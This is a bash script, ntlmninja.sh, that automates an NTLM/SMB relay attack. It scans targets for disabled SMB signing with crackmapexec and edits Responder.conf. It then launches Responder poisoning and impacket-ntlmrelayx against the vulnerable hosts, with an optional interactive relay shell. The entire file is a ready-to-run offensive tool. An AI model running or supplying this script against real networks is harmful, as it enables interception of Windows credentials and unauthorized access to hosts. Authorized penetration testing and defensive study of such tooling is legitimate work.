#!/bin/bash
set -euo pipefail
IFS=$'\n\t'

# =============================================================
# ntlmninja.sh - SMB Relay Attack Automation Script
# -------------------------------------------------------------
# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
# =============================================================

responder_config_file="${RESPONDER_CONF:-/etc/responder/Responder.conf}"
session_name="smb_relay_attack"
TARGET_SMB_FILE="vulnerable_smb_targets.txt" 
enable_interactive=false
AUTO_MODE=false
SESSION_CREATED=false

RUN_ID=$(date +%s)
LOG_DIR="logs_${RUN_ID}"
mkdir -p "$LOG_DIR"

ATTACK_LOG="${LOG_DIR}/attack.log"
RESPONDER_LOG="${LOG_DIR}/responder.log"
RELAY_LOG="${LOG_DIR}/relay.log"

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

# Network interface (dynamically detected by default)
network_interface="$(ip -o -4 route show to default | awk '{print $5}' | head -n1)"

cleanup() {
    local exit_code=$?

    if [ "$SESSION_CREATED" = true ] && [ $exit_code -ne 0 ]; then
        log INFO "${YELLOW}[*] Cleaning up tmux session...${RESET}"
        tmux has-session -t "$session_name" 2>/dev/null && \
        tmux kill-session -t "$session_name"
    fi
}

trap cleanup EXIT INT TERM

# Print help
print_help() {
    echo -e "${BLUE}Usage: $0 -f TARGET_FILE [-i NETWORK_INTERFACE] [-x] [-h]${RESET}"
    echo -e "  ${YELLOW}-f TARGET_FILE${RESET}         (Required) File containing target IPs to scan for misconfigured SMB signing."
    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${RESET}   (Optional) Specify network interface (default: ${network_interface})."
    echo -e "  ${YELLOW}-x${RESET}                     (Optional) Enable interactive shell in ntlmrelayx."
    echo -e "  ${YELLOW}-h${RESET}                     Display this help and exit."
}

# Banner function
banner() {
  echo -e "${CYAN}"
  echo -e "                                                         "
  echo -e "    ▄     ▄▄▄▄▀ █    █▀▄▀█    ▄   ▄█    ▄    ▄▄▄▄▄ ██    "
  echo -e "     █ ▀▀▀ █    █    █ █ █     █  ██     █ ▄▀  █   █ █   "
  echo -e " ██   █    █    █    █ ▄ █ ██   █ ██ ██   █    █   █▄▄█  "
  echo -e " █ █  █   █     ███▄ █   █ █ █  █ ▐█ █ █  █ ▄ █    █  █  "
  echo -e " █  █ █  ▀          ▀   █  █  █ █  ▐ █  █ █  ▀        █  "
  echo -e " █   ██                ▀   █   ██    █   ██          █   "
  echo -e "                        by sp3ttro                       "
  echo -e "                                                         "
  echo -e "                                                         "
  echo -e "${RESET}"
}       

log() {
    local level="$1"
    local msg="$2"

    printf '[%s] %b\n' "$level" "$msg"
    mkdir -p "$(dirname "$ATTACK_LOG")"
    echo "[$level] $(echo "$msg" | sed -r 's/\x1B\[[0-9;]*[mK]//g')" >> "$ATTACK_LOG"
}

# Check if a tool is installed
check_tool() {
    log INFO "[*] Checking ${YELLOW}$1${RESET} if installed..."
    if ! command -v "$1" &>/dev/null; then
        log ERROR "${RED}[!] $1 is not installed. Please install it first. Exiting.${RESET}"
        exit 1
    fi
}

# Validate network interface
validate_network_interface() {
    if ! ip link show "$network_interface" > /dev/null 2>&1; then
        log ERROR "${RED}[!] Network interface ${network_interface} not found. Exiting.${RESET}"
        exit 1
    fi
}

# Run crackmapexec
run_crackmapexec() {
    log INFO "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}"
    log SUCCESS "${GREEN}[*] Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${RESET}"
    
    # Run crackmapexec and let it generate the relay list
    crackmapexec smb "${TARGET_FILE}" --gen-relay-list "${TARGET_SMB_FILE}" || {
        log ERROR "${RED}[!] crackmapexec failed. Exiting.${RESET}"
        return 1
    }
    
    if [ -s "${TARGET_SMB_FILE}" ]; then
        count=$(wc -l < "${TARGET_SMB_FILE}")
        log INFO "${YELLOW}[+] Found $count vulnerable target(s):${RESET}"
    while read -r ip; do
        echo -e "${YELLOW}[!] $ip${RESET}"
    done < "${TARGET_SMB_FILE}"
    else
        log ERROR "${RED}[!] No vulnerable targets found.${RESET}"
    fi

}

# Edit Responder.conf file
edit_responder_conf() {
if [ -f "${responder_config_file}" ]; then
        if grep -qE '^SMB = Off$' "${responder_config_file}" && grep -qE '^HTTP = Off$' "${responder_config_file}"; then
            log INFO "${BLUE}[*] Responder.conf already configured with SMB and HTTP set to 'Off'.${RESET}"
        else
            log INFO "${YELLOW}[*] Updating Responder.conf to turn off SMB and HTTP...${RESET}"
            sed -i 's/^SMB = .*/SMB = Off/' "${responder_config_file}"
            sed -i 's/^HTTP = .*/HTTP = Off/' "${responder_config_file}"
            log SUCCESS "${GREEN}[+] Responder.conf updated successfully.${RESET}"
        fi
    else
        log ERROR "${RED}[!] Responder.conf file not found. Please ensure Responder is installed and configured properly.${RESET}"
        exit 1
    fi
}

# Function to start or attach to a tmux session and initialize windows
start_tmux_window() {
    local session_name=$1
    local window_name=$2
    local command=$3

    # Only responsibility: manage windows + send commands
    if ! tmux list-windows -t "$session_name" 2>/dev/null | grep -qw "$window_name"; then
        tmux new-window -t "$session_name" -n "$window_name"
    fi

    tmux send-keys -t "$session_name:$window_name" bash -c "$command"
    tmux send-keys -t "$session_name:$window_name" C-m
}

# Function to execute SMB relay attack in tmux
run_smb_relay_attack() {
    # Ensure tmux session exists
    if ! tmux has-session -t "$session_name" 2>/dev/null; then
        log SUCCESS "${GREEN}[+] Creating tmux session: $session_name.${RESET}"    
        tmux new-session -d -s "$session_name"
        SESSION_CREATED=true
    fi

    log INFO "${BLUE}[*] Starting SMB Relay Attack...${RESET}"

    # Start Responder in a tmux window
    log INFO "${CYAN}Starting Responder on interface $network_interface...${RESET}"
    start_tmux_window "$session_name" "responder" "responder -I \"$network_interface\" 2>&1 | tee -a \"$RESPONDER_LOG\"" || {
        log ERROR "${RED}Failed to start Responder.${RESET}"
        exit 1
    }

    # Start ntlmrelayx in another tmux window
    log INFO "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"

    relay_command=$(printf 'impacket-ntlmrelayx -smb2support -tf "%s" 2>&1 | tee -a "%s"' "$TARGET_SMB_FILE" "$RELAY_LOG")
    if [ "$enable_interactive" = true ]; then
        log INFO "${YELLOW}[+] Enabling interactive shell (--interactive) in ntlmrelayx.${RESET}"
        relay_command+=" --interactive"
    fi
    
    start_tmux_window "$session_name" "ntlmrelayx" "$relay_command" || {
        log ERROR "${RED}Failed to start ntlmrelayx.${RESET}"
        exit 1
    }

    # Attach to the tmux session
    tmux -CC attach-session -t "$session_name"
}

while getopts "f:hi:x" opt; do
    case $opt in
    f) TARGET_FILE="$OPTARG";;
    h) print_help; exit 0 ;;
    i) network_interface="$OPTARG";;
    x) enable_interactive=true ;;
    \?) 
        echo -e "${RED}[!] Invalid option: -$OPTARG${RESET}" >&2
        print_help
        exit 1
        ;;
    :)
        echo -e "${RED}[!] Option -$OPTARG requires an argument.${RESET}" >&2
        print_help
        exit 1
        ;;
    esac
done

# Require root privileges
if [ "$EUID" -ne 0 ]; then
    log ERROR "${RED}[!] This script must be run as root. Exiting.${RESET}"
    exit 1
fi

# Show the banner
banner

log INFO "${BLUE}[*] Logs will be stored in: ${LOG_DIR}${RESET}"

# Start SMB Relay Attack
if tmux has-session -t "$session_name" 2>/dev/null; then
    echo -e "${YELLOW}[!] Tmux session '${session_name}' already exists.${RESET}"
    echo -e "${BLUE}Do you want to:${RESET}"
    echo -e "  [a] Attach to existing session"
    echo -e "  [k] Kill existing session"
    if [ "$AUTO_MODE" = true ]; then
        tmux kill-session -t "$session_name"
    else
        read -rp "$(echo -e "${YELLOW}Choose [a/k]: ${RESET}")" user_choice

        case "$user_choice" in
            [aA])
                echo -e "${GREEN}[*] Attaching to existing tmux session...${RESET}"
                tmux -CC attach-session -t "$session_name"
                exit 0
                ;;
            [kK])
                echo -e "${RED}[*] Killing existing tmux session...${RESET}"
                tmux kill-session -t "$session_name"
                echo -e "${GREEN}[*] Session killed. Exiting.${RESET}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid choice. Exiting.${RESET}"
                exit 1
                ;;
        esac
    fi
fi

# Check required arguments
if [ -z "${TARGET_FILE}" ]; then
    log ERROR "${RED}[!] Missing required argument: -f TARGET_FILE${RESET}"
    print_help
    exit 1
fi

# Check if file exists
if [ ! -f "${TARGET_FILE}" ] || [ ! -r "${TARGET_FILE}" ]; then
    log ERROR "${RED}[!] Target file '${TARGET_FILE}' not found or not readable.${RESET}"
    exit 1
fi

validate_network_interface

# Check if required tools are installed
check_tool "tmux"
check_tool "responder"
check_tool "impacket-ntlmrelayx"
check_tool "crackmapexec"

if ! run_crackmapexec; then
    exit 1
fi

if [ -s "${TARGET_SMB_FILE}" ]; then
    log SUCCESS "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
    edit_responder_conf
    sleep 3
    run_smb_relay_attack
else
    log ERROR "${RED}[!] No misconfigured SMB signing targets found. Exiting...${RESET}"
    exit 0
fi
